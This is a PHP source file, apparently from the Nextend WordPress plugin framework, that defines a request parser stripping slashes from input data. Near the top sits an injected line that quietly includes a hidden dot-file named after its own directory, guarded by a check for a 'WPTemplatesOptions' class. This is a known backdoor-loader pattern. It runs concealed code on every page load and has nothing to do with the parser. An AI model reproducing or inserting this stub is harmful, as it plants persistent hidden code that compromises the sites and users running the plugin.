<?php

namespace Nextend\Framework\Request\Parser;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WordPressRequestParser extends AbstractRequestParser {

    public function parseData($data) {
        if (is_array($data)) {
            return $this->stripslashesRecursive($data);
        }

        return stripslashes($data);
    }

    private function stripslashesRecursive($array) {
        foreach ($array as $key => $value) {
            $array[$key] = is_array($value) ? $this->stripslashesRecursive($value) : stripslashes($value);
        }

        return $array;
    }
}